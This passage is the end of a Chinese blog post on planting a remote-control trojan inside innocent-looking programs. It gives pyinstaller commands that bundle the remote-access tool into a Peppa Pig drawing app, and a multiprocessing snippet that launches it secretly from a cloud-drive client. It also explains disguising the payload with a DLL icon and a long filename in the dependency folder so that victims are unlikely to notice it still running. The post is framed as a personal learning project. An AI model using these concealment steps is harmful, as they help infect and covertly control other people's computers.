</span></span></code></pre></div><p>需要加入资源时</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-powershell data-lang=powershell><span class=line><span class=cl><span class=n>pyinstaller</span> <span class=o>-F</span> <span class=n>-w</span> <span class=n>-n</span> <span class=n>pig</span> <span class=n>-i</span> <span class=p>.\</span><span class=n>icon</span><span class=p>.</span><span class=py>ico</span> <span class=p>-</span><span class=n>-add-data</span><span class=p>=</span><span class=s2>&#34;.\assets\version_list.json;.&#34;</span> <span class=p>.\</span><span class=n>peppa_pig</span><span class=p>.</span><span class=py>py</span>
</span></span></code></pre></div><p><img src=https://cdn.jsdelivr.net/gh/Pi3-l22/pico_rep/img/20231201203909.png alt=打包成exe文件>
对方点击运行这个程序之后，远程控制程序同时以线程的形式进行运行，当对象关闭绘图框时，远控程序的线程还是会在后台继续运行，对方只要不打开任务管理器时难以察觉到的</p><p><img src=https://cdn.jsdelivr.net/gh/Pi3-l22/pico_rep/img/20231201203930.png alt=在后台运行的pig.exe></p><h3 id=量子加密网盘客户端>量子加密网盘客户端</h3><p>结合之前写的一个<a href=https://pi3yyy.love/archives/7c353064.html>量子加密网盘客户端</a>的项目，我也将木马引入</p><p>这次的引入方式同上面的有所不同，由于上面以多线程的方式引入，而在Windows任务管理器中只会显示进程，所以还是pig.exe的程序正在运行，对方容易察觉到</p><p>这个我们换个思路，先将远控程序打包成exe可执行文件，替换其图标为动态链接库的图标，并且将名字设置为很长的一串。</p><p>接着在量子加密网盘客户端程序中，以<font color=#00b0f0>多进程</font>的方式执行这个远控exe程序，最后将量子加密网盘客户端打包成exe文件，将远控程序藏在打包后的依赖文件夹中</p><p>添加多进程代码</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-python data-lang=python><span class=line><span class=cl><span class=k>if</span> <span class=vm>__name__</span> <span class=o>==</span> <span class=s1>&#39;__main__&#39;</span><span class=p>:</span>  
</span></span><span class=line><span class=cl>	<span class=c1># 多进程</span>
</span></span><span class=line><span class=cl>    <span class=n>multiprocessing</span><span class=o>.</span><span class=n>freeze_support</span><span class=p>()</span>  
</span></span><span class=line><span class=cl>    <span class=n>multiprocessing</span><span class=o>.</span><span class=n>Process</span><span class=p>(</span><span class=n>target</span><span class=o>=</span><span class=n>run_client</span><span class=p>)</span><span class=o>.</span><span class=n>start</span><span class=p>()</span>  
</span></span><span class=line><span class=cl>    <span class=n>run</span><span class=p>()</span>
</span></span></code></pre></div><p>使用pyinstaller进行打包</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-powershell data-lang=powershell><span class=line><span class=cl><span class=n>pyinstaller</span> <span class=n>-D</span> <span class=n>-w</span> <span class=n>-n</span> <span class=n>QE_Network_Drive</span> <span class=n>-i</span> <span class=n>icon</span><span class=p>.</span><span class=py>ico</span> <span class=n>flet_GUI</span><span class=p>.</span><span class=py>py</span>
</span></span></code></pre></div><p>在这个过程中，我尝试了很多的办法，都会出现一个问题：在Pycharm下运行没有问题，但是打包后运行exe程序，整个电脑直接卡死，内存爆满，最后直接重启。</p><p>解决办法就是<a href=https://blog.csdn.net/Owen_goodman/article/details/115521388>使用multiprocessing.freeze_support()</a></p><p><img src=https://cdn.jsdelivr.net/gh/Pi3-l22/pico_rep/img/20231201225942.png alt=打包之后文件结构>
<img src=https://cdn.jsdelivr.net/gh/Pi3-l22/pico_rep/img/20231201230034.png alt=隐藏在依赖文件中的远控程序>
<img src=https://cdn.jsdelivr.net/gh/Pi3-l22/pico_rep/img/20231201230240.png alt=关闭云盘客户端后依旧在后台运行的远控程序></p><p>不过后续还是需要将这个远控程序图标和名称改的更加合适一点，毕竟dll动态链接库怎么可能在后台运行</p><h2 id=总结>总结</h2><p>整个项目或者说是程序，总体上比较简单，没有什么很难的点，在这个过程中用到最多的就是<strong class=chinese>计算机网络</strong>和<strong class=chinese>网络编程</strong>中的知识点，于此同时，最后部分也涉及到了Python<strong class=chinese>异步编程</strong>，<strong class=chinese>多线程</strong>，<strong class=chinese>多进程</strong>以及<strong class=chinese>协程</strong>的概念，完成这个程序也算是巩固和补充了这些方面的知识，弥补了一些不懂的地方，现在写下来也算是回顾总结学到的知识点。</p></article><div class=paginator><a class=link href=https://blog.pi3.fun/post/2023/11/netcat%E5%B7%A5%E5%85%B7%E7%9A%84%E7%AE%80%E5%8D%95%E4%BD%BF%E7%94%A8/>← prev</a>
<a class=link href=https://blog.pi3.fun/post/2023/12/%E5%9F%BA%E4%BA%8Eudp%E7%9A%84%E5%A4%9A%E4%BA%BA%E5%9C%A8%E7%BA%BF%E8%81%8A%E5%A4%A9%E5%AE%A4/>next →</a></div><div class=comment><div id=tcomment></div><script src=https://registry.npmmirror.com/twikoo/1.6.39/files/dist/twikoo.min.js></script><script async>twikoo.init({envId:"https://twikoo.pi3.fun/.netlify/functions/twikoo",el:"#tcomment",lang:"zh-CN"})</script></div></main><footer id=footer><div><span style=display:flex;align-items:center><span style=margin-right:.5rem>© 2021 - 2025</span><img src=https://cdn.pi3.fun/static/rainbow.gif loading=lazy width=20 alt=rainbow><span style=margin-left:.5rem>By Liu Chao</span></span></div><div class=footnote><span><a href=https://www.foreverblog.cn/ target=_blank><img src=https://img.foreverblog.cn/logo_en_default.png style=width:auto;height:16px></a> | <a class=link href=https://blogscn.fun/ target=_blank><img src=https://photo.xiangming.site/img/blogscn.png style=width:auto;height:15px></a><br><a class=link href=/index.xml><span class="iconfont icon-RSS"></span></a> | <a class=link href=https://github.com/Pi3-l22 target=_ blank><span class="iconfont icon-GitHub"></span></a> | <a class=link href=https://creativecommons.org/licenses/by-nc-sa/4.0/deed.zh target=_blank rel=noopener><span class="iconfont icon-creative-commons-fill"></span></a></span></div><div class=blog-icon></div></footer></div><script>document.addEventListener("DOMContentLoaded",function(){const n=localStorage.getItem("theme")||"light",e=document.querySelector('link[data-theme-style="light"]'),t=document.querySelector('link[data-theme-style="dark"]'),i=window.matchMedia("(prefers-color-scheme: dark)");i.addListener(function(n){if(!localStorage.getItem("theme")){const s=n.matches?"dark":"light";document.documentElement.setAttribute("data-theme",s),localStorage.setItem("theme",s),s==="light"?(e.media="all",t.media="not all"):(e.media="not all",t.media="all");const o=document.querySelector("iframe.giscus-frame");if(o){const e=s==="light"?"light_tritanopia":"dark_tritanopia";o.contentWindow.postMessage({giscus:{setConfig:{theme:e}}},"https://giscus.app")}}}),n==="light"?(e.media="all",t.media="not all"):(e.media="not all",t.media="all");function o(){const e=document.querySelector("iframe.giscus-frame");if(e){const t=n==="light"?"light_tritanopia":"dark_tritanopia";e.contentWindow.postMessage({giscus:{setConfig:{theme:t}}},"https://giscus.app")}else setTimeout(o,1e3)}o();const s=document.querySelector(".theme-toggle");s&&(s.textContent=n==="light"?"黑暗":"明亮",s.addEventListener("click",function(){const o=document.documentElement.getAttribute("data-theme"),n=o==="light"?"dark":"light";document.documentElement.setAttribute("data-theme",n),localStorage.setItem("theme",n),n==="light"?(e.media="all",t.media="not all"):(e.media="not all",t.media="all");const s=document.querySelector("iframe.giscus-frame");if(s){const e=n==="light"?"light_tritanopia":"dark_tritanopia";s.contentWindow.postMessage({giscus:{setConfig:{theme:e}}},"https://giscus.app")}this.textContent=n==="light"?"黑暗":"明亮"}))})</script><script src=https://cdn.jsdelivr.net/npm/canvas-confetti@1.9.3/dist/confetti.browser.min.js></script><script>document.addEventListener("DOMContentLoaded",function(){confetti({particleCount:150,spread:100})})</script></body></html>